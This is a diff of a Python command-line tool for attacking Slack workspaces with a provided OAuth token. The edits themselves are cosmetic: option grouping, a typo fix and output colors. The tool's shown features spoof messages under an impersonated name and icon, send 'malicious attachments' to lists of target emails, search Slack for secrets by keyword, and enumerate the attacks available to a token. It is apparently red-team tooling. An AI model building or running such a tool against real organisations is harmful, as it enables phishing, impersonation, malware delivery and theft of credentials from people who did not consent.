@@ -1,10 +1,10 @@
 #! /usr/bin/env python3
 
-import os
 from slack import WebClient
 import argparse
 from colorama import Fore, init
 
+# Added text color
 init(autoreset=True)
 red = Fore.RED
 green = Fore.GREEN
@@ -28,17 +28,23 @@ def title():
  / /_/ / /_/ / /_         
 /_____/\____/\__/
 ''')
+    
 parse = argparse.ArgumentParser()
-# Display help 
-parse.add_argument('-t','--token',help='Slack Oauth token',action='store',required=True)
-parse.add_argument('-sP','--spoof',help='Spoof a Slack message, customizing your name, icon, etc (Requires -e or -eL)',action='store_true')
-parse.add_argument('-m','--message',help='Send a message as the bot associated with your token (Requires -e or -eL)',action='store_true')
-parse.add_argument('-s','--search',help='Search slack for secrets with a keyword',action='store_true')
-parse.add_argument('-a','--attach',help='Send a message containing a malicious attachment (Requires -f and -e or -eL)',action='store_true')
-parse.add_argument('-f','--file',help='Path to file attachment',action='store')
-parse.add_argument('-e','--email',help='Email of target',action='store')
-parse.add_argument('-eL','--email_list',help='Path to list of emails separated by newline',action='store')
-parse.add_argument('-c','--check',help='Lookup and display the permissions and available attacks associated with your provided token.',action='store_true')
+group_req = parse.add_argument_group("Required")
+group_attack = parse.add_argument_group("Attacks")
+group_args = parse.add_argument_group("Arguments")
+
+# Display help page
+group_req.add_argument('-t','--token',help='Slack Oauth token',action='store',required=True)
+group_attack.add_argument('-sP','--spoof',help='Spoof a Slack message, customizing your name, icon, etc (Requires -e or -eL)',action='store_true')
+group_attack.add_argument('-m','--message',help='Send a message as the bot associated with your token (Requires -e or -eL)',action='store_true')
+group_attack.add_argument('-s','--search',help='Search slack for secrets with a keyword',action='store_true')
+group_attack.add_argument('-a','--attach',help='Send a message containing a malicious attachment (Requires -f and -e or -eL)',action='store_true')
+group_args.add_argument('-f','--file',help='Path to file attachment',action='store')
+group_args.add_argument('-e','--email',help='Email of target',action='store')
+group_args.add_argument('-eL','--email_list',help='Path to list of emails separated by newline',action='store')
+group_args.add_argument('-c','--check',help='Lookup and display the permissions and available attacks associated with your provided token.',action='store_true')
+
 args = parse.parse_args()
 
 t = WebClient(args.token)
@@ -79,7 +85,6 @@ user_id = ""
 # lookup userid by email address
 def lookupByEmail():
     lookup = t.api_call("users.lookupByEmail?email=" + args.email)
-    #print(lookup['user']['id'])
     global user_id
     user_id = lookup['user']['id']
 
@@ -88,7 +93,7 @@ botname,icon,message = '','',''
 def setupSpoofMessage():
     global botname,icon,message
     div()
-    botname = input(green+'Type the name you\'d like to impersionate\n'+blue+'Example: '+white+'SecurityBot\n'+white)
+    botname = input(green+'Type the name you\'d like to impersonate\n'+blue+'Example: '+white+'SecurityBot\n'+white)
     div()
     icon = input(green+'Type the URL to an image you\'d like to use as your profile photo\n'+white)
     div()
@@ -142,13 +147,12 @@ def sendMessageToList():
     for address in r.readlines():
         lookupByEmailList(address)
         sendMessage()
-        print(green+"Sending Message to: " + address)
+        print(green+"Sending Message to: " + white+address)
     r.close()
 
 # Lookup slack userid for each email in list
 def lookupByEmailList(email_address):
     lookup = t.api_call("users.lookupByEmail?email=" + email_address)
-    #print(lookup['user']['id'])
     global user_id
     user_id = lookup['user']['id']    
 
@@ -162,7 +166,8 @@ def setupFileMessage():
     div()
     print(
           blue+'Slack Message: ' + white+message +'\n'+
-          blue+'Title of file: ' + white+file_title
+          blue+'Title of file: ' + white+file_title+'\n'+
+          blue+'Attached File: ' + white+args.file
         )
     div()
     ready = input(red + 'Ready to send your message? y/n\n'+white)
@@ -179,7 +184,7 @@ def sendFileToList():
     for address in r.readlines():
         lookupByEmailList(address)
         sendFile()
-        print(green+"Sending File to: " + address)
+        print(green+"Sending File to: " + white+address)
     r.close()
 
 def sendFile():
